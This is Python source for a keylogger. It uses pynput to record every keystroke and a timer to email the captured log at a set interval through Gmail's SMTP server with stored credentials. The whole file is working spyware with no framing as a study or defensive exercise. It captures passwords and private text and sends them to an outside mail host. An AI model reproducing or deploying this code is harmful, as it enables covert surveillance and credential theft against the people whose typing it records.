import pynput.keyboard
import threading
import smtplib

# Initialize an empty log string
log = ""

class KeyLogger:
    
    def __init__(self, time_interval, email, password):
        # Initialize the log with a message indicating the keylogger has started
        self.log = "keylogger started"
        # Set the interval for reporting and sending emails
        self.interval = time_interval
        # Set the email and password for sending emails
        self.email = email
        self.password = password
        
    def append_to_log(self, string):
        # Append the given string to the log
        self.log = self.log + string
        
    def process_key_press(self, key):
        try:
            # Convert the key to a string if it is a character
            current_key = str(key.char)
        except AttributeError:
            # If the key is not a character, handle it accordingly
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        # Append the key to the log
        self.append_to_log(current_key)
        
    def report(self):
        # Print the current log
        print(self.log)
        # Send the log via email
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        # Reset the log
        self.log = ""
        # Schedule the next report
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        
    def send_mail(self, email, password, message):
        # Set up a secure SMTP connection to Gmail
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        # Log in to the email account
        server.login(email, password)
        # Send the email
        server.sendmail(email, email, message)
        # Close the SMTP connection
        server.quit()
        
    def start(self):
        # Create a keyboard listener
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        # Start the listener and report the keys in a separate thread
        with keyboard_listener:
            self.report()
            # Wait for the listener to finish
            keyboard_listener.join()